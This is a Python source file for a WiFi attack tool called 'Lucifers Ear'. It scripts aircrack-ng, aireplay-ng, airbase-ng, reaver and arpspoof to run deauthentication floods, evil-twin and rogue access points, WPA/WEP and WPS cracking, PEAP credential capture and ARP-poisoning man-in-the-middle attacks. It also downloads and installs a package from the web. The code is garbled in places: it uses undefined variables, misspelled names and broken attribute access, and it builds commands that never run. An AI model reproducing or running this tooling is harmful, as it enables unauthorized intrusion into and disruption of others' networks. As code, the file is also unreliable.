#!/usr/bin/python

#LE - Lucifers Ear
#Creator: Dawid Wordliczek
#
#I'm not responsible for bad using
#of this tool.
#
#This tools can be use for penetration
#testing of WiFi networks.
#LE has some MitM attacks and many others.
#You can here automaticly config some basic
#information before you will do pentests and
#get some updates for the attacks which are 
#use by LE tool, for example like: installing
#FreeRadius server. You have here many options
#and many posibilities. Use it wisly.

import subprocess
import datetime
from termcolor import colored
import time

#****************************************************************************************************************************************************************************************
class conf:
	__interfacemon = ' '
	__interface = ' '

	def info(self):
		subprocess.call('clear', shell=True)
		print colored("conf class\n", 'green')
		print
		print

	def config(self):
		try:
			print colored("Give a name of network interface you use: \n", 'green')
			self.__interface = raw_input()

			print colored("Create monitoring interface\n", 'green')
			com = 'airmon-ng start ' + interface
			subprocess.call(com, shell=True)

			print colored("Give an address mac of router you want listen: \n", 'green')
			mactrgt = raw_input()

			print colored("Give a name of the interfacemon: \n", 'green')
			self.__interfacemon = raw_input()

			print colored("If you want to listening now please give a command \'lst\' otherwise click Enter button", 'green')
			choice = raw_input()
			if (choice == 'lst'):
				print colored("Listening of our target at new window\n", 'green')
				com2 = 'airodump-ng --bssid ' + mactrgt + ' ' + interfacemon
				maincom = 'xterm -hold -e ' + '\'' + com2 + '\' &'
				subprocess.call(maincom, shell=True)

			print colored("If you want to set up a num of channel give a command \'nch\' otherwise click Enter button", 'green')
			choice2 = raw_input()
			if (choice2 == 'nch'):
				print colored("Give a number of channel of the router you want to listen and capture:\n", 'green')
				numch = raw_input()

				print colored("Setting up of our interface\n", 'green')
				com3 = 'iwconfig ' + interfacemon + ' channel ' + numch
				subprocess.call(com3, shell=True)

			print colored("Monitoring messages from our system kernel at new window\n", 'green')
			com4 = 'tail -f -n 0 /var/log/messages'
			maincom2 = 'xterm -hold -e ' + '\'' + com4 + '\' &'
			subprocess.call(com4, shell=True)

			print colored("If you want to set up a country for your interface give a command \'cny\' otherwise click Enter button", 'green')
			choice3 = raw_input()
			if (choice3 == 'cny'):
				print colored("Give a country name to adaptated of the network interface depending on the country, example for US: iw reg set US\n", 'green')
				country = raw_input()
				com5 = 'iw reg set ' + country
			time.sleep(5)
			print
			print
		except OSError:
			print colored('Something went wrong!!! Propably you give wrong interface or IP address of the target!!!\n', 'cyan')
			time.sleep(5)
			print
			print

#**********************************************************************************************************************************************************************************************************
class packetinjection:
	def info(self):
		subprocess.call('clear', shell=True)
		print colored("packetinjection\n", 'green')
		print

	def inject(self):
		try:
			print colored("Give MAC address where you want inject packets\n", 'green')
			mac = raw_input()
			obj = conf()
			com = 'tshark -n -i ' + obj.__interfacemon + '(wlan.bssid == ' + mac + ') && !(wlan.fc.type.subtype == 0x08)'
			maincom2 = 'xterm -hold -e ' + '\'' + com + '\' &'
			subprocess.call(maincom2, shell=True)

			print colored("Give name of your target(router) for example like \'Wireless Lab\'\n", 'green')
			routerrrgt = raw_input()
			com2 = 'aireplay-ng -9 -e ' + routertrgt + ' -a ' + mac + ' ' + obj.__interfacemon
			maincom = 'xterm -hold -e ' + '\'' + com2 + '\' &'
			subprocess.call(maincom, shell=True)
			print
			print
			time.sleep(5)
		except OSError:
			print colored('Something went wrong!!! Propably you give wrong interface or IP address of the target!!!\n', 'cyan')
			time.sleep(5)
			print
			print

#****************************************************************************************************************************************************************************************************************
class tdfr:
	def info(self):
		subprocess.call('clear', shell=True)
		print colored("Data from router\n", 'green')
		print
		print

	def see(self):
		try:
			print colored("Give a MAC address of the router which data want to see:\n", 'green')
			mac = raw_input()
			obj = conf()
			com = 'tshark -n -i ' + obj.__interfacemon + '(wlan.bssid==' + mac + ') && (wlan.fc.type_subtype == 0x20)'
			maincom = 'xterm -hold -e ' + '\'' + com + '\' &'
			subprocess.call(maincom, shell=True)
			time.sleep(5)
			print
			print
		except OSError:
			print colored('Something went wrong!!! Propably you give wrong interface or IP address of the target!!!\n', 'cyan')
			time.sleep(5)
			print
			print

#******************************************************************************************************************************************************************************************************************
class DoHNSSID:
	def info(self):
		subprocess.call('clear', shell=True)
		print colored("Disclosure of hidden network SSIDs\n", 'green')
		print
		print

	def dohnssid(self):
		try:
			obj = conf()
			print colored("Give a MAC address of the router\n", 'green')
			mac = raw_input()
			com = 'aireplay-ng -0 5 -a ' + mac + ' ' + obj.__interfacemon
			subprocess.call(com, shell=True)
			print
			print
		except OSError:
			print colored('Somehing went wrong!! Propably you give wrong interface or IP address of the target!!!\n', 'cyan')
			time.sleep(5)
			print
			print

#******************************************************************************************************************************************************************************************************************
class BMAF:
	def info(self):
		subprocess.call('clear', shell=True)
		print colored("Bypassing MAC address filtering\n", 'green')
		print
		print

	def bmaf(self):
		try:
			print colored("Give a MAC address which you want to have\n", 'green')
			mac = raw_input()
			obj = conf()
			com = 'macchanger -m ' + mac + ' ' + obj.__interfacemon
			subprocess.call(com, shell=True)

			print colored("Give a number of channel you want use for this attack.\n", 'green')
			numch = raw_input()
			com2 = 'airodump-ng -c ' + numch + ' -a -bssid ' + mac + ' ' + obj.__interfacemon
			subprocess.call(com2, shell=True)
			print
			print
		except OSError:
			print colored('Somehing went wrong!! Propably you give wrong interface or IP address of the target!!!\n', 'cyan')
			time.sleep(5)
			print
			print

#******************************************************************************************************************************************************************************************************************
def ctaapwoa(self):
	try:
		subprocess.call('clear', shell=True)
		print colored("Give name of the router:\n", 'green')
		nr = raw_input()
		obj = conf()
		com = 'iwconfig ' + obj.__interface + ' essid \"' + nr + '\"'
		subprocess.call(com, shell=True)
		print
		print
	except OSError:
		print colored('Somehing went wrong!! Propably you give wrong interface or IP address of the target!!!\n', 'cyan')
		time.sleep(5)
		print
		print

#******************************************************************************************************************************************************************************************************************
class BAwaSK:
	def info(self):
		subprocess.call('clear', shell=True)
		print colored("Bypassing authentication with a shared key.\n", 'green')
		print
		print

	def bawask(self):
		try:
			obj = conf()
			print colored("Give number of channel you want use:\n", 'green')
			numch = raw_input()
			print colored("Give MAC address of the target:\n", 'green')
			mac = raw_input()
			com = 'airodump-ng ' + obj.__interfacemon + ' -c ' + numch + ' --bssid ' + mac + ' -w keystream'
			maincom = 'xterm -hold -e ' + '\'' + com + '\' &'
			subprocess.call(maincom, shell=True)
			print colored("When listing will finished give \'next\' command\n", 'green')
			choice = raw_input()
			if (choice == 'next'):
				print colored("Give a name or the target router:\n", 'green')
				nr = raw_input()
				print colored("Give a name of keystream file:\n", 'green')
				nf = raw_input()
				com2 = 'aireplay-ng -1 0 -e ' + nr + ' -y ' + nf + ' -a ' + mac + ' -h aa:aa:aa:aa:aa:aa ' + obj._interfacemon
				subprocess.call(com, shell=True)

				print
				print
				time.sleep(5)
		except OSError:
			print colored('Somehing went wrong!! Propably you give wrong interface or IP address of the target!!!\n', 'cyan')
			time.sleep(5)
			print
			print

#******************************************************************************************************************************************************************************************************************
class BWPiNwWPE:
	def info(self):
		subprocess.call('clear', shell=True)
		print colored("Breaking weak passwords in networks with WPA-PSK encryption.\n", 'green')
		print
		print

	def bwpinwwpe(self):
		try:
			print colored("Give a MAC address of the target:\n", 'green')
			mac = raw_input()
			print colored("Give a number of channel you want set on your interface:\n", 'green')
			numch = raw_input()
			obj = conf()
			com = 'airodump-ng --bssid ' + mac + ' --channel ' + numch + ' --write WPACracking ' + obj.__interfacemon
			maincom = 'xterm -hold -e ' + '\'' + com + '\' &'
			subprocess.call(maincom, shell=True)
			print colored("Give \'next\' command to continue\n", 'green')
			choice1 = raw_input()
			if (choice1 == 'next'):
				print colored("If you want your own list of passwords give \'own\' command else press button Enter\n", 'green')
				choice = raw_input()
				com2 = ''
				if (choice == 'own'):
					print colored("Give a path to your passwords list:\n", 'green')
					passlst = raw_input()
					com2 = 'aircrack-ng WPACracking.cap -w ' + passlst
				else:
					com2 = 'aircrack-ng WPACracking.cap -w /usr/share/wordlists/nmap.lst'

				subprocess.call(com2, shell=True)
				print
				print
				time.sleep(5)
		except OSError:
			print colored('Somehing went wrong!! Propably you give wrong interface or IP address of the target!!!\n', 'cyan')
			time.sleep(5)
			print
			print

#******************************************************************************************************************************************************************************************************************
class AoBWWPSKE:
	def info(self):
		subprocess.call('clear', shell=True)
		print colored("Acceleration of breaking WPA / WPA2 PSK encryption\n", 'green')
		print
		print

	def aobwwpske(self):
		print colored("Give a name of the router target:\n", 'green')
		nr = raw_input()
		print colored("Choose one of the options:\n1.genpmk\n2.cowpatty\n3.Pyrit\n", 'green')
		choice = raw_input()
		com = ''

		try:
			if (choice == '1'):
				print colored("If you want your own list of passwords give \'own\' command else press Enter\n", 'green')
				choice2 = raw_input()
				if (choice2 == 'own'):
					print colored("Give a path to your passwords list:\n", 'green')
					passlst = raw_input()
					com = 'genpmk -f ' + passlst + ' -d PMK-Wireless-Lab -s ' + nr
				else:
					com = 'genpmk -f /usr/share/wordlists/nmap.lst -d PMK-Wireless-Lab -s ' + nr
			if (choice == '2'):
				print colored("Give \'next\' command to continue\n", 'green')
				choice3 = raw_input()
				if(choice3 == 'next'):
					com2 = 'cowpatty -d PMK-Wireless-Lab -s ' + nr + ' -r WPACracking.cap'
					subprocess.call(com2, shell=True)
					com3 = 'airolib-ng PMK-Aircrack --import cowparty PMK-Wireless-Lab'
					maincom = 'xterm -hold -e ' + '\'' + com3 + '\' &'
					subprocess.call(maincom, shell=True)
					com4 = 'aircrack-ng -r PMK-Aircrack WPACracking.cap'
					subprocess.call(com4, shell=True)
					print colored("Give \'next\' command to continue\n", 'green')
					choice4 = raw_input()
					if(choice4 == 'next'):
						if (choice == '3'):
							subprocess.call('Pyrit -r .pcap -i PMK', shell=True)
							subprocess.call(com, shell=True)
			print
			print
			time.sleep(5)
		except OSError:
			print colored('Somehing went wrong!! Propably you give wrong interface or IP address of the target!!!\n', 'cyan')
			time.sleep(5)
			print
			print

#******************************************************************************************************************************************************************************************************************
class DPWW:
	def info(self):
		subprocess.call('clear', shell=True)
		print colored("Decryption of WEP and WPA packages\n", 'green')
		print
		print

	def dpww(self):
		print colored("Give a name of the router:\n", 'green')
		nr = raw_input()
		print colored("Give a name of .cap file:\n", 'green')
		nc = raw_input()
		print colored("Give a password you break before:\n", 'green')
		key = raw_input()

		try:
			com = 'airdecap-ng -p ' + key + ' ' + nc + ' -e \"' + nr + '\"'
			print colored("Set how much time you want wait:\n", 'green')
			htm = raw_input()
			subprocess.call(com, shell=True)
			print colored("Give \'next\' command to continue\n", 'green')
			choice = raw_input()
			if(choice == 'next'):
				print colored("Give an input file -dec.cap:\n", 'green')
				ncc = raw_input()
				com2 = 'tshark -r ' + ncc
				maincom = 'xterm -hold -e ' + '\'' + com2 + '\' &'
				subprocess.call(maincom, shell=True)
				print
				print
				time.sleep(5)
		except OSError:
			print colored('Somehing went wrong!! Propably you give wrong interface or IP address of the target!!!\n', 'cyan')
			time.sleep(5)
			print
			print


#******************************************************************************************************************************************************************************************************************
def ctnuWEP(self):
	try:
		subprocess.call('clear', shell=True)
		print colored("Connecting to a network using WEP encryption", 'green')
		print
		print
		print colored("Give a name of the router:\n", 'green')
		nr = raw_input()
		print colored("Give a password to the network:\n", 'green')
		key = raw_input()
		myobj = conf()
		com = 'iwconfig ' + myobj.__interface + ' essid \"' + nr + '\" key ' + key
		subprocess.call(com, shell=True)
		print
		print
		time.sleep(5)
	except OSError:
		print colored('Something went wrong!! Propably you give wrong interface or IP address of the target!!!\n', 'cyan')
		time.sleep(5)
		print
		print

#******************************************************************************************************************************************************************************************************************
def ctnuWPA(self):
	try:
		subprocess.call('clear', shell=True)
		obj = conf()
		subprocess.call('touch wpa_supp.conf', shell=True)
		print colored("Give a name of the router:\n", 'green')
		nr = raw_input()
		print colored("Give a password to the network:\n", 'green')
		password = raw_input()
		word = '#WPA-PSK/TKP\nnetwork={\n\tssid=\"' + nr + '\"\n\tkey_mgmt=WPA-PSK\n\tproto=WPA\n\tpairwise=TKP\n\tgroup=TKIP\n\tpsk=\"' + password + '\"\n}'
		with open("wpa_supp.conf", "w") as f:
			data = word
			f.write(data)
		com2 = 'wpa_supplicant -D wext -i ' + obj.__interface + ' -c wpa_supp.conf'
		subprocess.call(com2, shell=True)
		com3 = 'dhcpclient3 ' + obj.__interface
		subprocess.call(com3, shell=True)
		print
		print
		time.sleep(5)
	except OSError:
		print colored('Something went wrong!!! Propably you give wrong interface or IP address of the target!!!\n', 'cyan')
		time.sleep(5)
		print
		print

#********************************************************************************************************************************************************************************************************************
class ADoSCA:
	def info(self):
		subprocess.call('clear', shell=True)
		print colored("DoS deauthentication\n", 'green')
		print
		print

	def adosca(self):
		try:
			subprocess.call('airodump-ng', shell=True)
			print colored("Give a MAC address of the router target:\n", 'green')
			mac = raw_input()
			obj = conf()
			print colored("If you need there is an option to attack every client - \'every\' command or click Enter button", 'green')
			choice = raw_input()
			maincom = ''
			com = '' 
			if (choice == 'every'):
				com = 'aireplay-ng -0 0 -a ' + mac + ' --ignore-negative-one' + obj.__interfacemon
				maincom = 'xterm -hold -e ' + '\'' + com + '\' &'
			else:
				com = 'aireplay-ng -0 5 -a ' + mac + ' --ignore-negative-one ' + obj.__interfacemon
				maincom = 'xterm -hold -e ' + '\'' + com + '\' &'
			subprocess.call(maincom, shell=True)
			print
			print
			time.sleep(5)
		except OSError:
			print colored('Something went wrong!!! Propably you give wrong interface or IP address of the target!!!\n', 'cyan')
			time.sleep(5)
			print
			print

#********************************************************************************************************************************************************************************************************************
class BadTwin:
	def info(self):
		subprocess.call('clear', shell=True)
		print colored("Bad Twin\n", 'green')
		print
		print

	def badtwin(self):
		obj = conf()
		try:
			com = 'airodump-ng' + obj.__interfacemon
			maincom = 'xterm -hold -e ' + '\'' + com + '\' &'
			subprocess.call(maincom, shell=True)
			print colored('Give a name of the bad Twin:\n', 'green')
			name = raw_input()
			com2 = 'airbase-ng --essid ' + name + ' -c 11 ' + obj.__interfacemon
			subprocess.call(com2, shell=True)
			print colored('Tooked packets and listening\n', 'green')
			com3 = 'airodump-ng --channel 11 ' + obj.__interfacemon
			maincom2 = 'xterm -hold -e ' + '\'' + com3 +'\' &'
			subprocess.call(maincom2, shell=True)
			print colored('Sending deauthentication packets\n', 'green')
			print colored('Give an address MAC of the target:\n', 'green')
			mactrgt = raw_input()
			com4 = 'aireplay-ng -0 0 -a ' + mactrgt + ' --ignore-negative-one ' + obj.__interfacemon
			maincom3 = 'xterm -hold -e ' + '\'' + com4 + '\' &'
			subprocess.call(maincom3, shell=True)
			print colored('Falsing a BSSID and MAC', 'green')
			print colored('Give a false MAC address of your router:\n', 'green')
			rm = raw_input()
			print colored('Give a false name of the router:\n', 'green')
			rn = raw_input()
			com5 = 'airbase-ng -a ' + rm + ' --essid \"' + rn + '\" -c 11 ' + obj.__interfacemon
			maincom4 = 'xterm -hold -e ' + '\'' + com5 + '\' &'
			subprocess.call(maincom4, shell=True)
			print
			print
			time.sleep(5)
		except OSError:
			print colored('Something went wrong!!! Propably you give wrong interface or IP address of the target!!!\n', 'cyan')
			time.sleep(5)
			print
			print

#********************************************************************************************************************************************************************************************************************
class NAAP:
	def info(self):
		subprocess.call('clear', shell=True)
		print colored("Welcome at Nonauthorized Access Point\n", 'green')
		print
		print

	def naap(self):
		try:
			print colored("Running nonauthorized access point\n", 'green')
			obj = conf()
			print colored("Give a name of your nonauthorized access point\n", 'green')
			nr = raw_input()
			com = 'airbase-ng --essid ' + nr + ' -c 11 ' + obj.__interfacemon
			maincom = 'xterm -hold -e ' + '\'' + com + '\' &'
			subprocess.call(maincom, shell=True)
			print colored("Check that you have installed bridge-utills, if not give command: \'install\' else press ENTER", 'green')
			choice = raw_input()
			if (choice == "install"):
				subprocess.call('apt-get install bridge-utills', shell=True)
				subprocess.call('brctl addbr Wifi-Bridge', shell=True)
			print colored("Ethernet Bridge and virtual at0\n", 'green')
			print colored("Give a name of the bridge\n", 'green')
			nb = raw_input()
			com2 = 'brctl addif ' + nb + ' eth0'
			subprocess.call(com2, shell=True)
			com3 = 'brctl addif ' + nb + ' at0'
			subprocess.call(com3, shell=True)
			print colored('Activation of the interfaces\n', 'green')
			print colored("Give an address ip of the eth0 interface\n", 'green')
			addrip = raw_input()
			com4 = 'ifconfig eth0 ' + addrip + ' up'
			subprocess.call(com4, shell=True)
			print colored("Give an address ip of the at0 interface\n", 'green')
			addrip2 = raw_input()
			com5 = 'ifconfig at0 ' + addrip2 + ' up'
			subprocess.call(com5, shell=True)
			print colored("Alternative giving packets\n", 'green')
			com6 = 'echo 1 > /proc/sys/net/ipv4/ip_forward'
			subprocess.call(com6, shell=True)
			print
			print
			time.sleep(5)
		except OSError:
			print colored('Something went wrong!!! Propably you give wroong interface or IP address of the target!!!\n', 'cyan')
			time.sleep(5)
			print
			print

#********************************************************************************************************************************************************************************************************************
class MA:
	def info(self):
		subprocess.call('clear', shell=True)
		print colored("Misassociation attack\n", 'green')
		print
		print

	def ma(self):
		try:
			obj = conf()
			com = 'airodump-ng ' + obj.__interfacemon
			subprocess.call(com, shell=True)
			print colored("Give an address MAC:\n", 'green')
			mac = raw_input()
			com2 = 'tshark -n -i ' + obj.__interfacemon + '(wlan.sa==' + mac + ') && (wlan.fc.type_subtype == 0x04)'
			maincom = 'xterm -hold -e \'' + com2 + '\' &'
			subprocess.call(maincom, shell=True)
			print colored("Give a name of the bad twin:\n", 'green')
			nr = raw_input()
			com3 = 'airbase-ng -c 3 -e ' + nr + ' ' + obj.__interfacemon
			maincom2 = 'xterm -hold -e \'' + com3 + '\' &'
			subprocess.call(maincom2, shell=True)
			print colored("Choose one of the scenarious of the attack:\n", 'green')
			print colored("1. Waiting for target connection to our access point\n", 'green')
			print colored("2. Deauthentication of the target from access point\n", 'green')
			choice = raw_input()
			if(choice == '1'):
				print colored("Give \'next\' command to continue\n", 'green')
				choices = raw_input()
				if(choices == 'next'):
					print
					print
					time.sleep(5)
			elif(choice == '2'):
				print colored("Deauthentication of the target from his access point\n", 'green')
				com = 'aireplay-ng --deauth 0 -a ' + mac + ' --ignore-negative-one ' + obj.__interfacemon
				print colored("Give \'next\' command to continue\n", 'green')
				choicess = raw_input()
				if(choicess == 'next'):
					print
					print
					time.sleep(5)
		except OSError:
			print colored("Something went wrong!!! Propably you give wrong interface or IP address of the target!!!\n", 'cyan')
			time.sleep(5)
			print
			print

#********************************************************************************************************************************************************************************************************************
class CLA:
	def info(self):
		subprocess.call('clear', shell=True)
		print colored("Caffe Latte attack\n", 'green')
		print
		print

	def cla(self):
		try:
			obj = conf()
			com = 'airodump-ng'
			maincom = 'xterm -hold -e \'' + com + '\' &'
			subprocess.call(maincom, shell=True)
			com2 = 'airbase-ng -c 3 -a ' + mac + ' -e ' + nr + ' -L -W 1 ' + obj.__interfacemon
			maincom2 = 'xterm -hold -e \'' + com2 + '\' &'
			subprocess.call(maincom2, shell=True)
			print colored("If you will see that target is connect to us, use command \'next\'\n", 'green')
			choice = raw_input()
			if (choice == 'next'):
				subprocess.call('airbase-ng', shell=True)
				print colored("Give a name of your access point\n", 'green')
				nr = raw_input()
				com = 'airodump-ng ' + obj.__interfacemon + ' --bssid ' + nr + ' -w keystream'
				maincom = 'xterm -hold -e \'' + com + '\' &'
				subprocess.call(maincom, shell=True)
				print ("If airodummp finished writing to the \'keystream\' file you can use command \'next\'\n", 'green')
				choice2 = raw_input()
				if(choice2 == 'next'):
					subprocess.call('aircrack-ng keystream', 'green')
			time.sleep(5)
			print
			print
		except OSError:
			print colored("Something went wrong!!! Propably you give wrong interface or IP address of the target!!!\n", 'cyan')
			time.sleep(5)
			print
			print

#********************************************************************************************************************************************************************************************************************		
class DCfW:
	def info(self):
		subprocess.call('clear', shell=True)
		print colored("Client Deauthentication for WEP or WPA/WPA2\n", 'green')
		print
		print

	def dcfw(self):
		try:
			com = 'airodump-ng'
			maincom = 'xterm -hold -e \'' + com + '\' &'
			subprocess.call(maincom, shell=True)
			print colored("Attack on connect between client and access point", 'green')
			obj = conf()
			print colored("Give a MAC address of your target:\n", 'green')
			mac = raw_input()
			com2 = 'aireplay-ng --deauth 0 -a ' + mac + ' --ignore-negative-one ' + obj.__interfacemon
			maincom2 = 'xterm -hold -e \'' + com2 + '\' &'
			subprocess.call(maincom2, shell=True)
			print
			print
			time.sleep(5)
		except OSError:
			print colored("Something went wrong!!! Propably you give wrong interface or IP address of the target!!!\n", 'cyan')
			time.sleep(5)
			print
			print

#********************************************************************************************************************************************************************************************************************
class HIRTE:
	def info(self):
		subprocess.call('clear', shell=True)
		print colored("Deauthentication - Hirte\n", 'green')
		print
		print

	def hirte(self):
		try:
			print colored("Give a MAC address of your target:\n", 'green')
			mac = raw_input()
			print colored("Give a name of your false access point:\n", 'green')
			nr = raw_input()
			obj = conf()
			com = 'airbase-ng -c 3 -a ' + mac + ' -a ' + nr + ' -L -W 1 ' + obj.__interfacemon
			maincom = 'xterm -hold -e \'' + com + '\' &'
			subprocess.call(maincom, shell=True)
			com2 = 'airodump-ng -c 3 --bssid ' + mac + ' --write Hirte ' + obj.__interfacemon 
			maincom2 = 'xterm -hold -e \'' + com2 + '\' &'
			subprocess.call(maincom2, shell=True)
			print colored("Client is connect? If yes give command \'yes\'\n", 'green')
			choice = raw_input()
			if (choice == 'yes'):
				print colored("Client is connect\n", 'green')
				com3 = 'airbase-ng -c 3 -a ' + nr + ' -W 1 -N ' + obj.__interfacemon
				maincom3 = 'xterm -hold -e \'' + com3 + '\' &'
				subprocess.call(maincom3, shell=True)
				print colored("Cracking...\n", 'green')
				subprocess.call('aircrack-ng Hirte', shell=True)
				print
				print
				time.sleep(5)
		except OSError:
			print colored("Something went wrong!!! Propably you give wrong interface or IP address of the target!!!\n", 'cyan')
			time.sleep(5)
			print
			print

#********************************************************************************************************************************************************************************************************************
class  BWPAwAP:
	def info(self):
		subprocess.call('clear', shell=True)
		print colored("Breaking WPA PSK key without access point\n", 'green')
		print 
		print

	def bwpawap(self):
		try:
			print colored("Give a name of your false router", 'green')
			nr = raw_input()
			obj = conf()
			com = 'airbase-ng -c 3  -e ' + nr + ' -W 1 -z 2 ' + obj.__interfacemon
			maincom = 'xterm -hold -e \'' + com + '\' &'
			subprocess.call(maincom, shell=True)
			print colored("Give a MAC address of your target", 'green')
			mac = raw_input()
			com2 = 'airodump-ng -c 3 --bssid ' + mac + ' --write AP-less-WPA-Cracking ' + obj.__interfacemon
			maincom2 = 'xterm -hold -e \'' + com2 + '\' &'
			print colored("If client is connect to our access point give command \'yes\'\n", 'green')
			choice = raw_input()
			if(choice == 'yes'):
				print colored("Cracking...", 'green')
				subprocess.call('aircrack-ng AP-less-WPA-Cracking', shell=True)
				time.sleep(5)
				print
				print
		except OSError:
			print colored("Something went wrong!!! Propably you give wrong interface or IP address of the target!!!\n", 'cyan')
			time.sleep(5)
			print
			print

#********************************************************************************************************************************************************************************************************************
class IFR:
	def info(self):
		subprocess.call('clear', shell=True)
		print colored("Installation of freeradius server\n", 'green')
		print
		print

	def instfree(self):
		try:
			print colored("FreeRadius download package...\n", 'green')
			subprocess.call('wget https://github.com/brad/anton/freeradius-wpe/raw/master/freeradius-server-wpe_2.1.12-1_i386.deb', shell=True)
			print colored("Download finished\n", 'green')
			print colored("FreeRadius installation...\n", 'green')
			subprocess.call('dpkg -i freeradius-server-wpe_2.1.12-1_i386.deb', shell=True)
			print colored("Installation finished\n", 'green')
			time.sleep(5)
			print
			print
		except OSError:
			print colored("Something went wrong!!! Propably you give wrong interface or IP address of the target!!!\n", 'cyan')
			time.sleep(5)
			print
			print

#********************************************************************************************************************************************************************************************************************
class CFR:
	def info(self):
		subprocess.call('clear', shell=True)
		print colored("FreeRadius Configuration\n", 'green')
		print
		print

	def cfr(self):
		try:
			print colored("Configuration...\n", 'green')
			print colored("Choose interface for configuration of FR\n", 'green')
			interface = raw_input()
			com = 'dhclient ' + interface
			subprocess.call(com, shell=True)
			com2 = 'nano /usr/local/etc/raddb/eap.conf'
			maincom = 'xterm -hold -e \'' + com2 + '\' &'
			subprocess.call(maincom, shell=True)
			print colored("In the file search \'default_eap_type\' where is \'md5\' and change it to \'peap\'", 'green')
			print colored("Give command \'next\' if you've done editing a eap.conf file\n", 'green')
			choice = raw_input()
			if (choice == 'next'):
				com3 = 'nano /usr/local/etc/raddb/clients.conf'
				maincom2 = 'xterm -hold -e \'' + com3 + '\' &'
				print colored("Here you should write a list of the clients like: \'199.168.0.0/16\tsecret=test\'\n", 'green')
				print colored("If you finished give \'next\' command\n", 'green')
				chocie = raw_input()
				if (choice == 'next'):
					subprocess.call('radius -s -X\n', shell=True)
					print colored("FR is work!!!\n", 'green')
					time.sleep(5)
					print
					print
		except OSError:
			print colored("Something went wrong!!! Propably you give wrong interface or IP address of the target!!!\n", 'cyan')
			time.sleep(5)
			print
			print

#********************************************************************************************************************************************************************************************************************
class BPEAP:
	def info(self):
		subprocess.call('clear', shell=True)
		print colored("Breaking PEAP\n", 'green')
		print
		print

	def bpeap(self):
		try:
			print colored("Checking the the eap.conf file...\n", 'green')
			subprocess.call('radiusd -s -X', shell=True)
			print colored("Monitoring FR logs...\n", 'green')
			com = 'tail -f freeradius-server-wpe.log'
			maincom = 'xterm -hold -e \'' + com + '\' &'
			subprocess.call(maincom, shell=True)
			print colored("If user is connected give \'next\' command\n", 'green')
			choice = raw_input()
			if (choice == 'next'):
				print colored("Dictonary attack...\n", 'green')
				print colored("Give Mac address of your target:\n", 'green')
				mactrgt = raw_input()
				print colored("Give a response from freeradius-=server-wpe.log\n", 'green')
				resp = raw_input()
				com2 = 'asleap -C ' + mactrgt + ' -R ' + resp + ' -W list'
				maincom2 = 'xterm -hold -e \'' + com2 + '\' &'
				subprocess.call(maincom2, shell=True)
				time.sleep(5)
				print
				print
		except OSError:
			print colored("Something went wrong!!! Propably you give wrong interface or IP address of the target!!!\n", 'cyan')
			time.sleep(5)
			print
			print

#********************************************************************************************************************************************************************************************************************
class WPSA:
	def info(self):
		subprocess.call('clear', shell=True)
		print colored("WPS Attack\n", 'green')
		print
		print

	def wpsa(self):
		try:
			print colored("Listening...\n", 'green')
			obj = conf()
			com = 'wash --ignore-fcs -i ' + obj.__interfacemon
			maincom = 'xterm -hold -e \'' + com + '\' &'
			subprocess.call(maincom, shell=True)
			print colored("Now conf for reaver:\n", 'green')
			print colored("Give MAC address of your target:\n", 'green')
			mactrgt = raw_input()
			print colored("Breaking...\n", 'green')
			com2 = 'reaver -i ' + obj.__interfacemon + ' -b ' + mactrgt + ' -vv'
			maincom2 = 'xterm -hold -e \'' + com2 + '\' &'
			subprocess.call(maincom2, shell=True)
			print colored("Give WPS PIN:\n", 'green')
			pin = raw_input()
			print colored("Connecting to network with WPS...\n", 'green')
			com3 = 'reaver -i ' + obj.__interfacemon + ' -b ' + mactrgt + ' -vv -p ' + pin
			maincom3 = 'xterm -hold -e \'' + com3 + '\' &'
			subprocess.call(maincom3, shell=True)
			time.sleep(5)
			print
			print
		except OSError:
			print colored("Something went wrong!!! Propably you give wrong interface or IP address of the target!!!\n", 'cyan')
			time.sleep(5)
			print
			print

#********************************************************************************************************************************************************************************************************************
class LAPN:
	def info(self):
		subprocess.call('clear', shell=True)
		print colored("Listening for Attempts to probe the network\n", 'green')
		print
		print

	def lapn(self):
		try:
			results = open("results.txt", "a")
			obj = conf()
			while 1:
				com = 'tshark -n -i ' + obj.__interfacemon + ' subtype probereq -T fields -e separator= -e wlan.sa -e wlan_mgt.ssid -c 100'
				maincom = 'xterm -hold -e \'' + com + '\' &'
				blah = subprocess.check_output([maincom], shell=True)
				splitblah = blah.split("\n")

			for value in splitblah[:-1]:
				splitvalue = value.split("\t")

			MAC = str(splitvalue[1])
			SSID = str(splitvalue[2])
			time = str(datetime.datetime.now())

			results.write(MAC+" "+SSID+" "+time+"\r\n")
		except OSError:
			print colored("Something went wrong!!! Propably you give wrong interface or IP address of the target!!!\n", 'cyan')
			time.sleep(5)
			print
			print

#********************************************************************************************************************************************************************************************************************
class mitmattack:
	def mitmarpcp(self):
		try:
			subprocess.call('clear', shell=True)
			print colored("MitM with ARP Cache Poisoning", 'green')
			print colored('MitMARPCP Processing ...', 'red')
			print
			subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)
			print colored('Value in \'/proc/sys/net/ipv4/ip_forward\':', 'red')
			subprocess.call('cat /proc/sys/net/ipv4/ip_forward', shell=True)
			print

			print colored('Give network interface you use: ', 'red')
			netinter = raw_input()
			print
			print colored('Give IP address of target: ', 'red')
			iptarget = raw_input()
			print
			print colored('Give false IP under you hiding:', 'red')
			falseip = raw_input()
			print
			com = 'arpspoof -i ' + netinter + ' -t ' + iptarget + ' ' + falseip
			maincom = 'xterm -hold -e ' + '\'' + com + '\' &'
			subprocess.call(maincom, shell=True)
			time.sleep(5)
			print
			print
		except OSError:
			print colored('Something went wrong!!! Propably you give wrong interface or IP address of the target!!!', 'cyan')
			time.sleep(5)
			print
			print

	def mitmarpsec(self, netinter, iptarget, falseip):
		try:
			subprocess.call('clear', shell=True)
			print colored("MitM with ARP Cache Poisoning", 'green')
                        print colored('MitMARPCP Processing ...', 'red')
                        print
                        subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)
                        print colored('Value in \'/proc/sys/net/ipv4/ip_forward\':', 'red')
                        subprocess.call('cat /proc/sys/net/ipv4/ip_forward', shell=True)
                        print
                        print
                        com = 'arpspoof -i ' + netinter + ' -t ' + iptarget + ' ' + falseip
                        maincom = 'xterm -hold -e ' + '\'' + com + '\' &'
                        subprocess.call(maincom, shell=True)
			time.sleep(5)
			print
			print
		except OSError:
			print colored('Something went wrong!!! Propably you give wrong interface or IP address of the target!!!', 'cyan')
			time.sleep(5)
                        print
                        print

	def mitmdcp(self):
		try:
			subprocess.call('clear', shell=True)
			print colored("MitM with DNS Cache Poisoning", 'green')
			print colored('MitMDCP Processing ...', 'red')
			print
			print

